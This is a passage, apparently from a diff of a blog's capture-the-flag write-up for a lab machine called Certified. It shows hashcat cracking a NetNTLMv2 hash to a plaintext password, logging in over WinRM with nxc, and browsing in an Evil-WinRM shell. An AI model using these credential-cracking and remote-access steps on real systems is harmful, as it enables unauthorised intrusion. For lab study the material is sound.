+THOMAS::CERTIFIEDDC:19bbd5a81cad0f04:80d912fa52cf34971a3fdefea8f5ba8e:010100000000000000d71dbebbc7db0118b6dc0df06b147600000000020008004700320044004a0001001e00570049004e002d00310053004a004f005000560034003400450057004d0004003400570049004e002d00310053004a004f005000560034003400450057004d002e004700320044004a002e004c004f00430041004c00030014004700320044004a002e004c004f00430041004c00050014004700320044004a002e004c004f00430041004c000700080000d71dbebbc7db010600040002000000080030003000000000000000000000000030000061b01f7990ef198fbbcac5835d9ab9d64c2de5811d6c3c117c768a5ca8377f510a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320032000000000000000000:159357
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 <span class="o">(</span>NetNTLMv2<span class="o">)</span>
+Hash.Target......: THOMAS::CERTIFIEDDC:19bbd5a81cad0f04:80d912fa52cf34...000000
+Time.Started.....: Sun May 18 14:17:19 2025 <span class="o">(</span>0 secs<span class="o">)</span>
+Time.Estimated...: Sun May 18 14:17:19 2025 <span class="o">(</span>0 secs<span class="o">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#1.........:   923.1 kH/s <span class="o">(</span>1.70ms<span class="o">)</span> @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+Progress.........: 2048/14344385 <span class="o">(</span>0.01%<span class="o">)</span>
+Rejected.........: 0/2048 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 0/14344385 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -&gt; lovers1
+Hardware.Mon.#1..: Util: 26%
+
+Started: Sun May 18 14:17:04 2025
+Stopped: Sun May 18 14:17:20 2025
+</code></pre></div></div>
+
+<p>Alright so we’ve cracked this user and ….</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ nxc winrm 10.129.229.25 -u 'thomas' -p '159357' -x whoami
+WINRM       10.129.229.25   5985   CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb) 
+WINRM       10.129.229.25   5985   CERTIFIED        [+] certified.htb\thomas:159357 (Pwn3d!)
+WINRM       10.129.229.25   5985   CERTIFIED        [-] Execute command failed, current user: 'certified.htb\thomas' has no 'Invoke' rights to execute command (shell type: cmd)
+WINRM       10.129.229.25   5985   CERTIFIED        [+] Executed command (shell type: powershell)
+WINRM       10.129.229.25   5985   CERTIFIED        certifieddc\thomas
+
+</code></pre></div></div>
+
+<p>PWN3D!!!</p>
+
+<p>Sadly, this user is only a basic user. Which is, super weird because it was like 10x harder to pull off to get. Maybe this user was only meant to be able to enroll in the Certificate Template??? Either way PWN3D!!!!!!</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\thomas&gt; cd ..
+*Evil-WinRM* PS C:\Users&gt; cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+Access is denied
+At line:1 char:1
++ cd Desktop
++ ~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop:String) [Set-Location], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.SetLocationCommand
+Cannot find path 'C:\Users\Administrator\Desktop' because it does not exist.
+At line:1 char:1
++ cd Desktop
++ ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+</code></pre></div></div>
 
       </section>
     </div>
